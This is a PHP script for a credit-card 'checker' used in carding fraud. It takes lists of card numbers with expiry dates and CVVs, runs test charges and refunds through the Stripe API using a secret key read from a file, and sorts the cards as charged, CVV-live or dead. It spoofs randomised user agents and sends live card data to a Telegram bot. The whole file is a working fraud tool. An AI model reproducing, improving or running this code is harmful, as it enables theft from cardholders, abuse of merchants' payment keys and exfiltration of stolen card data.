<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
$amount = 0.8;
$symbol = "$";
$sk = file("skusdwala.txt");
$sk = end($sk); 
$sk= trim($sk);
$amount = $_GET['amount'];
$amt = $amount;
$type = $_GET['type'];
$badboy = array("currency"=>"usd", "desc"=>"gunnu donation", "currency_symbol"=> "$","amount"=>$amount * 100, "country"=>"India", "sk"=>$sk);

function decline_reason($r1, $r2)
{
    $decline1 = trim(strip_tags(getStr($r1, '"decline_code": "', '"')));
    $decline2 = trim(strip_tags(getStr($r2, '"decline_code": "', '"')));
    $msg1 =  trim(strip_tags(getStr($r1, '"message": "', '"')));
    $msg2 =  trim(strip_tags(getStr($r2, '"message": "', '"')));

    if (!empty($decline1)) {
        return $decline1 . ": " . $msg1;
    } else if (!empty($decline2)) {
        return $decline2 . ": " . $msg2;
    } else {
        return "Unknown";
    }
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$lista = $_GET['lista'];
$cc = multiexplode(array(":", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", " ", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

# ------------ 1st Req

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
if (($type == 'ccn')||($type == 'ccnrefund')){
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$first.'&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]=Street '.rand(111, 999).'&card[address_line2]=Apartment&card[address_city]=Hyderabad&card[address_state]=Andhra Pradesh&card[address_zip]=501218&card[address_country]=India');
}
else {
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$first.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]=Street '.rand(111, 999).'&card[address_line2]=Apartment&card[address_city]=Hyderabad&card[address_state]=Andhra Pradesh&card[address_zip]=501218&card[address_country]=India');
}
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$sk.'',
));

$r1 = curl_exec($ch);
$tok = trim(strip_tags(getstr($r1,'"id": "', '"')));
$d_code1 = trim(strip_tags(getStr($r1,'"decline_code": "', '"')));

    if (empty($d_code1)) {
        $d_code1 = 'Unknown';
    }

if(strpos($r1, "generic_decline" )) {
$status = 'Declined';
$cc_code = 'DEAD';
echo '<p class="uk-margin-small-top">'.$status.' | '.$cc_code.' | ' . $lista . ' | generic_decline: Your card was declined.</p>';
die();
}
elseif(strpos($r1, "Your card was declined." )) {
$status = 'Declined';
$cc_code = 'DEAD';
echo '<p class="uk-margin-small-top">'.$status.' | '.$cc_code.' | ' . $lista . ' | '.$d_code.': Your card was declined.</p>';
die();
}

# ---------- 2nd Req

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$tok.'&description='.$badboy['desc'].'&amount='.$badboy['amount'].'&currency='.$badboy['currency'].'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$sk.'',
));

$r2 = curl_exec($ch);
$charge = trim(strip_tags(getstr($r2,'"id": "','"')));
$receipt = trim(strip_tags(getStr($r2,'"receipt_url": "','"')));

if ((!empty($charge)) AND ($type == 'refund') OR (!empty($charge)) AND ($type == 'ccnrefund')){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$charge.'&reason=requested_by_customer');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));


$r3 = curl_exec($ch);
}
#########################[Responses]############################
function sendMessage ($chatId, $message ) {
    $botToken = "bottoken";
    $website = "https://api.telegram.org/bot".$botToken;
    $url = $website."/sendMessage?chat_id=".$chatId."&text=".urlencode($message)."&parse_mode=HTML";
    url_get_contents($url);

}

function url_get_contents($Url) {
    if(!function_exists('curl_init')) {
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}


if (strpos($r2, '"seller_message": "Payment complete."')){
$status = '#CHARGED';
$cc_code = $symbol.$amt.' Charged By BADBOY';
if ($type == 'ccnrefund'){
$cc_code = $symbol.$amt.' CCN Charged & Refund By BADBOY';
}
elseif ($type == 'refund'){
$cc_code = $symbol.$amt.' Charged & Refund By BADBOY';
}
$tg_id = $_GET['tgid'];
sendMessage($tg_id, "<b>CC => <code>".$lista."</code>\nStatus => ".$cc_code."</b>");
echo '<p class="uk-margin-small-top">'.$status.' | '.$cc_code.' | ' . $lista . '  </p>';
exit;
}elseif ((strpos($r1,'insufficient_funds')) || (strpos($r2,'insufficient_funds'))){
$status = '#CVV';
$cc_code = 'Insufficient By BADBOY';
$forward = $_GET['forward'];
if (($forward == 'cvv')||($forward == 'live')){
$tg_id = $_GET['tgid'];
sendMessage($tg_id, "<b>CC => <code>".$lista."</code>\nStatus => ".$cc_code."</b>");
}
// echo "Chat: $gchatId";
echo '<p class="uk-margin-small-top">'.$status.' | ' . $cc_code . ' | ' . $lista . '  </p>';
exit;
}

elseif ((strpos($r1,'"cvc_check": "pass"')) || (strpos($r2,'"cvc_check": "pass"'))){
    $status = '#CVV';
    $cc_code = 'CVV Live By BADBOY ';
    if (($forward == 'cvv')||($forward == 'live')){
$tg_id = $_GET['tgid'];
sendMessage($tg_id, "<b>CC => <code>".$lista."</code>\nStatus => ".$cc_code."</b>");
}
echo '<p class="uk-margin-small-top">'.$status.' | ' . $cc_code . ' | ' . $lista . '  </p>';
exit;
}

elseif ((strpos($r1,'security code is incorrect')) || (strpos($r2,'security code is incorrect'))){
    $status = '#CCN';
    $cc_code = 'incorrect_cvc By BADBOY ';
    if ($forward == 'live'){
$tg_id = $_GET['tgid'];
sendMessage($tg_id, "<b>CC => <code>".$lista."</code>\nStatus => ".$cc_code."</b>");
}
echo '<p class="uk-margin-small-top">'.$status.' | ' . $cc_code . ' | ' . $lista . '  </p>';
exit;
}

elseif (strpos($r1, 'test_mode_live_card')){
$status = 'Dead';
$cc_code = 'Test Mode Charges Only';
}

elseif (strpos($r1, 'testmode_charges_only')){
$status = 'Dead';
$cc_code = 'Test Mode Charges Only';
}

elseif(strpos($r1, "rate_limit" )) {
$status = 'Dead';
$cc_code = 'Rate Limit';
}

elseif(strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe" )) {
$status = 'SK KEY';
$cc_code = 'SK KEY DEAD';
}

elseif(strpos($r1, "api_key_expired" )) {
$status = 'Dead';
$cc_code = 'Sk Key Expired';
}

else {
$status = 'Declined';
$cc_code = 'DEAD';
}
#########################[Responses Show Like]############################
echo '<p class="uk-margin-small-top">'.$status.' | '.$cc_code.' | ' . $lista . ' | '.decline_reason($r1, $r2).' </p>';
//sendMessage($gchatId, decline_reason($r1, $r2));
//echo "<b>1:</b>$r1<br><br>";
 //echo "<b>2:</b>$r2<br><br>";
curl_close($ch);
ob_flush();

?>